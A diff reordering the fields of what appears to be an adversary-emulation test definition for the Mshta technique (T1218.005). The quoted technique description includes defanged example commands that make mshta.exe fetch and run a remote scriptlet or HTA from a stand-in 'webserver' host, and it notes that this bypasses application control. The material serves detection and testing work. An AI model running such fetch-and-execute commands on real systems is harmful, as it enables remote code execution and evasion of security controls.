@@ -1,14 +1,3 @@
-guid: 007e5672-2088-4853-a562-7490ddc19447
-name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement
-tactic:
-  - defense-evasion
-technique:
-  - T1218.005
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.
 Attack_name: Mshta
 Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types\
   \ of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA)\
@@ -17,3 +6,14 @@ Attack_description: "Adversaries may abuse mshta.exe to proxy execution of malic
   \ mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta\
   \ http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's\
   \ security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
+guid: 007e5672-2088-4853-a562-7490ddc19447
+name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement
+tactic:
+  - defense-evasion
+technique:
+  - T1218.005
+os:
+  - windows
+description: Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.
+sigma: false
+sigma_rule: []
